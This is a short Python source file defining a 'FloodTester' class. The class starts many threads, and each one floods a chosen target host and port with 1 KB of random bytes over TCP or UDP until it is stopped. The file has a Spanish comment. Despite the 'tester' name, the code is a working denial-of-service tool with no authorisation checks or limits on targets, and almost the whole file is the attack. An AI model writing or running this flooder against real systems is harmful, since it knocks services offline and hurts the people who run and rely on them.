import socket
import threading
import time
import random
from typing import Dict

class FloodTester:
    def __init__(self):
        self._running = False
        self._stats = {"sent": 0, "errors": 0}

    def start_flood(self, target: str, port: int, method: str = "TCP", threads: int = 10):
        self._running = True
        self._stats = {"sent": 0, "errors": 0}
        
        for _ in range(threads):
            t = threading.Thread(target=self._flood_worker, args=(target, port, method))
            t.daemon = True
            t.start()
            
    def stop_flood(self):
        self._running = False

    def get_stats(self) -> Dict:
        return self._stats

    def _flood_worker(self, target: str, port: int, method: str):
        while self._running:
            try:
                if method == "TCP":
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((target, port))
                    s.send(random._urandom(1024))
                    s.close()
                elif method == "UDP":
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(random._urandom(1024), (target, port))
                
                self._stats["sent"] += 1
            except Exception:
                self._stats["errors"] += 1
            time.sleep(0.01) # Pequeña pausa para no congelar el host local completamente

flood_instance = FloodTester()
